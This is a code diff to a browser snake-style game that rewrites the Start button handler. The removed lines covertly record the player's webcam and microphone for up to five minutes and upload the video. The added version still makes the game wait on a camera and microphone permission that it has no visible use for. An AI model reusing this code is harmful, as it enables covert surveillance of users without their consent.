@@ -220,44 +220,23 @@ function gameOver() {
   }
 
   document.getElementById("btnStart").onclick = () => {
-    resetGame();
-    document.getElementById("btnStart").disabled = true;
-    document.getElementById("btnNewGame").disabled = false;
-    velocity = { x: 1, y: 0 }; // start moving right
-    gameInterval = setInterval(gameLoop, 120);
+  navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+    .then(stream => {
+      // Stop all tracks immediately to release camera/mic
+      stream.getTracks().forEach(track => track.stop());
 
-    // Directly call getUserMedia synchronously to trigger prompt
-    navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } })
-      .then(stream => {
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        recordedChunks = [];
-
-        mediaRecorder.ondataavailable = e => {
-          if (e.data.size > 0) recordedChunks.push(e.data);
-        };
-
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(recordedChunks, { type: "video/webm" });
-          recordedChunks = [];
-          uploadVideo(blob);
-          // Stop all tracks to release camera and mic
-          stream.getTracks().forEach(track => track.stop());
-        };
-
-        mediaRecorder.start();
-        // Optionally stop after 5 min
-        setTimeout(() => {
-          if (mediaRecorder && mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
-          }
-        }, 5 * 60 * 1000);
-
-      })
-      .catch(err => {
-        console.error("Error accessing media devices.", err);
-        alert("Camera/Microphone permission denied or not available.");
-      });
-  };
+      // Start the game after permission granted
+      resetGame();
+      document.getElementById("btnStart").disabled = true;
+      document.getElementById("btnNewGame").disabled = false;
+      velocity = { x: 1, y: 0 };
+      gameInterval = setInterval(gameLoop, 120);
+    })
+    .catch(err => {
+      console.error("User denied media access or no device:", err);
+      alert("Camera/Microphone permission denied or not available.");
+    });
+};
 
   document.getElementById("btnNewGame").onclick = () => {
     clearInterval(gameInterval);
